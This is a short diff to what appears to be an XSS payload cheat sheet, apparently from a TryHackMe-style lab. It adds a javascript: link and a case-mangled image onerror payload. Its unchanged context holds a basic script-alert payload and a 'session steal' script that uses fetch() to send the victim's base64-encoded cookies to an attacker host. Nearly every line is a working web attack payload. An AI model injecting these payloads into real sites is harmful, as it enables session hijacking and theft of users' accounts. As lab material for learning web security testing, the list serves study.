@@ -2,6 +2,9 @@
 
 <script>alert('XSS');</script>
 
+<a href="javascript:alert(1)">CLICK HERE</a>
+<Img sRc=x OnError=confirm(1)>
+
 # session steal
 
 <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
